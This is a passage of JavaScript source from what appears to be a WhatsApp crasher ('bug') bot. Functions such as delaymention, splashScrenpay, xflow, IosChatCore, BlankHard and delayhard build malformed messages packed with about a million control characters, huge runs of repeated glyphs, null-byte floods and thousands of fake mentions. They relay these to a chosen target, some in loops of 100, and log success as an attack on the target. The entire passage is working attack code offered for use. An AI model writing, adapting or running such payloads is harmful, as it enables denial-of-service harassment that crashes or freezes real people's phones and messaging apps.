    mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",  
  },  
  {  
    ID: "68884987",  
    uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",  
    buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",  
    sid: "5e03e0",  
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",  
    ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",  
    mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",  
  }
]

for (const msg of [msg4, msg5, msg6]) {  
  await xincrash.relayMessage("status@broadcast", msg, {  
    messageId: undefined,  
    statusJidList: [target],  
    additionalNodes: [  
      {  
        tag: "meta",  
        attrs: {},  
        content: [  
          {  
            tag: "mentioned_users",  
            attrs: {},  
            content: [{ tag: "to", attrs: { jid: target } }]  
          }  
        ]  
      }  
    ]  
  });  
}  

for (const msg of [msg1, msg2, msg3]) {  
  await xincrash.relayMessage("status@broadcast", msg, {  
    messageId: undefined,  
    statusJidList: [target],  
    additionalNodes: [  
      {  
        tag: "meta",  
        attrs: {},  
        content: [  
          {  
            tag: "mentioned_users",  
            attrs: {},  
            content: [{ tag: "to", attrs: { jid: target } }]  
          }  
        ]  
      }  
    ]  
  });  
}  

for (const msg of msg7) {  
  await xincrash.relayMessage("status@broadcast", msg, {  
    messageId: undefined,  
    statusJidList: [target],  
    additionalNodes: [  
      {  
        tag: "meta",  
        attrs: {},  
        content: [  
          {  
            tag: "mentioned_users",  
            attrs: {},  
            content: [{ tag: "to", attrs: { jid: target } }]  
          }  
        ]  
      }  
    ]  
  });  
}

console.log(`GanyangKuota Attacked Sending Bug To ${target} Suksesfull`);

} catch (e) {
console.error(e);
}
}

async function delaymention(xincrash, target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
        },
      },
    },
  };
  
    let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "JustinXKoirii",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });
    for (let i = 0; i < 100; i++) {
  const janda = generateWAMessageFromContent(target, message, {});

        await xincrash.relayMessage("status@broadcast", message.message, {
            messageId: message.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                { tag: "to", attrs: { jid: target }, content: undefined }
                            ]
                        }
                    ]
                }
            ]
        });
        
        await xincrash.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                { tag: "to", attrs: { jid: target }, content: undefined }
                            ]
                        }
                    ]
                }
            ]
        });
        if (i < 99) {
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
}

async function splashScrenpay(xincrash, target) {
  try {
    let msg1 = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: "-!justinv24", format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "payment_settings",
                paramsJson: "\x10".repeat(1045000),
                version: 3,
              },
              entryPointConversionSource: "galaxy_message",
              entryPointConversionApp: "WhatsApp",
            },
          },
        },
      },
      {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background:
          "#" +
          Math.floor(Math.random() * 16777215)
            .toString(16)
            .padStart(6, "999999"),
      }
    );

    await xincrash.relayMessage(target, msg1.message, {
      messageId: msg1.key.id,
    });

    let paymentInfoMsg = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: "P", format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "payment_info",
                paramsJson: "\x12".repeat(1045000),
                version: 3,
              },
              entryPointConversionSource: "payment_info",
              entryPointConversionApp: "WhatsApp",
            },
          },
        },
      },
      {
        ephemeralExpiration: 0,
        forwardingScore: 7777,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background:
          "#" +
          Math.floor(Math.random() * 16777215)
            .toString(16)
            .padStart(6, "FF0000"),
      }
    );

    await xincrash.relayMessage(target, paymentInfoMsg.message, {
      messageId: paymentInfoMsg.key.id,
    });

    let paymentSettingsMsg = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: "p", format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "payment_settings",
                paramsJson: "\x13".repeat(1045000),
                version: 3,
              },
              entryPointConversionSource: "payment_settings",
              entryPointConversionApp: "WhatsApp",
            },
          },
        },
      },
      {
        ephemeralExpiration: 0,
        forwardingScore: 6666,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background:
          "#" +
          Math.floor(Math.random() * 16777215)
            .toString(16)
            .padStart(6, "00FF00"),
      }
    );

    
    await xincrash.relayMessage(target, paymentSettingsMsg.message, {
      messageId: paymentSettingsMsg.key.id,
    });

    let paymentRequestMsg = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: "P", format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "payment_request_pay",
                paramsJson: "\x14".repeat(1045000),
                version: 3,
              },
              entryPointConversionSource: "payment_request",
              entryPointConversionApp: "WhatsApp",
            },
          },
        },
      },
      {
        ephemeralExpiration: 0,
        forwardingScore: 9999,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background:
          "#" +
          Math.floor(Math.random() * 16777215)
            .toString(16)
            .padStart(6, "0000FF"),
      }
    );

    await xincrash.relayMessage(target, paymentRequestMsg.message, {
      messageId: paymentRequestMsg.key.id,
    });

    let callPermissionMsg = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: "P", format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\x15".repeat(1045000),
                version: 3,
              },
              entryPointConversionSource: "call_permission",
              entryPointConversionApp: "WhatsApp",
            },
          },
        },
      },
      {
        ephemeralExpiration: 0,
        forwardingScore: 8888,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background:
          "#" +
          Math.floor(Math.random() * 16777215)
            .toString(16)
            .padStart(6, "FFFF00"),
      }
    );

    await xincrash.relayMessage(target, callPermissionMsg.message, {
      messageId: callPermissionMsg.key.id,
    });

    let secondMsgContent = {
      extendedTextMessage: {
        text: "ꦾ".repeat(300000),
        contextInfo: {
          participant: target,
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 1900 },
              () =>
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
          ],
        },
      },
    };

    const msg2 = generateWAMessageFromContent(target, secondMsgContent, {});

    await xincrash.relayMessage(target, msg2.message, {
      messageId: msg2.key.id,
    });

    console.log('\x1b[32m%s\x1b[0m', 'DONE GA BANG?');

  } catch (error) {
    console.error("LAHK EROR ANJING", error, "Mengirim All Messages");
  }
}


//FUNCT KE 2
async function xflow(xincrash, target) {
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length:2000 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
      }, 
      body: {
        text: "-!justinv24",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, { userJid:target });
  
  await xincrash.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target, "13135550002@s.whatsapp.net"],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}


async function SuperIosCore2(target) {
      try {
        await xincrash.relayMessage(
          target,
          {
            extendedTextMessage: {
              text: "p",
              contextInfo: {
                stanzaId: "1234567890ABCDEF",
                participant: target,
                quotedMessage: {
                  callLogMesssage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "0",
                    callType: "REGULAR",
                    participants: [
                      {
                        jid: target,
                        callOutcome: "1",
                      },
                    ],
                  },
                },
                remoteJid: target,
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 9999999,
                isForwarded: true,
                quotedAd: {
                  advertiserName: "Example Advertiser",
                  mediaType: "IMAGE",
                  jpegThumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                  caption: "This is an ad caption",
                },
                placeholderKey: {
                  remoteJid: target,
                  fromMe: false,
                  id: "ABCDEF1234567890",
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret:
                  "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                  title: "justinoffc",
                  body: "justinoffc ganteng⭑",
                  mediaType: "VIDEO",
                  renderLargerThumbnail: true,
                  previewTtpe: "VIDEO",
                  thumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                  sourceType: " x ",
                  sourceId: " x ",
                  sourceUrl: "https://wa.me/justinoffc",
                  mediaUrl: "https://wa.me/justinoffc",
                  containsAutoReply: true,
                  showAdAttribution: true,
                  ctwaClid: "ctwa_clid_example",
                  ref: "ref_example",
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                  url: "https://wa.me/justinoffc",
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "6287888888888-1234567890@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                  utmSource: "utm_source_example",
                  utmCampaign: "utm_campaign_example",
                },
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "6287888888888-1234567890@g.us",
                  serverMessageId: 1,
                  newsletterName: " X ",
                  contentType: "UPDATE",
                  accessibilityText: " X ",
                },
                businessMessageForwardInfo: {
                  businessOwnerJid: "0@s.whatsapp.net",
                },
                smbvampCampaignId: "smb_vamp_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                  showMmDisclosure: true,
                },
              },
            },
          },
          {
            participant: { jid: target },
            userJid: target,
          }
        );
      } catch (err) {
        console.log(err);
      }
    }
    
 async function IosChatCore(target, Ptcp = true) {
      await xincrash.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "Halo...Saya Justin" + "\u0000".repeat(92000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 999999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "Boleh Telpon" + "\u0003".repeat(55555),
                body: "Angkat Dong" + "𑜦࣯".repeat(2000),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/justinoffc",
                mediaUrl: "https://t.me/justinoffc",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/justinoffc",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbvampCampaignId: "smb_vamp_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
    
//BLANK ANDROID
async function BlankHard(target) {
  await xincrash.relayMessage(target, {
    newsletterAdminInviteMessage: {
      newsletterJid: "1327272@newsletter",
      newsletterName: "🩸YT JUSTINOFFICIAL-ID" + "ោ៝".repeat(10000),
      caption: "ꦾ".repeat(1000),
      inviteExpiration: Date.now() + 1814400,
    },
  }, {});
  
  await xincrash.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "ោ៝".repeat(20000),
            locationMessage: {
              degreesLatitude: 0,
              degreesLongtitude: 0,
            },
            hasMediaAttachMent: true
          },
          body: {
            text: "🩸YT JUSTINOFFICIAL-ID" + "ꦾ".repeat(2000),
          },
          nativeFlowMessage: {
            messageParamsJson: "{}",
          },
          contextInfo: {
            forwadingScore: 100,
            isForwaded: true,
            businessMessageForwardInfo: {
              businessOwnerJid: "0@s.whatsapp.net",
            },
          },
        },
      },
    },
  }, { participant: { jid: target }, });
}

async function delayhard(target) {
    let crash = JSON.stringify({
      action: "x",
      data: "x"
    });
  
    await xincrash.relayMessage(target, {
      stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "🩸YT JustinOfficial-ID" + "ꦾ".repeat(77777),
      publisher: "JustinV22 Vip",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "Jawa Jawa",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
     remoteJid: "X",
      participant: "0@s.whatsapp.net",
      stanzaId: "1234567890ABCDEF",
       mentionedJid: [
         "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]       
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
